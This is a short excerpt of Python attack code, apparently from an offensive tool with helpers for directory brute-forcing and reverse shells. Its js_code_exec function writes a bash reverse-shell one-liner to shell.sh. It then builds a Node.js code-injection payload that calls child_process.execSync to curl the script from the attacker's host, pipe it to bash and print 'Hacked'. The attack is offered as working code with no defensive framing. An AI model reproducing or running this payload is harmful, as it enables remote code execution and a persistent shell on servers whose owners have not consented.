...
import random_utils
from attacks_utils import dirsearch, invert_ip, reverse_shell
...
async def js_code_exec() -> None:
    ...
    reverse_ip = invert_ip(settings.self_host)

    with open("assets/tmp/shell.sh", "w") as f:
        f.write(f"bash -i >& /dev/tcp/{reverse_ip}/8888 0>&1")

    code = f"global.process.mainModule.require('child_process').execSync('curl {reverse_ip}:8000/tmp/shell.sh | bash; echo Hacked')"
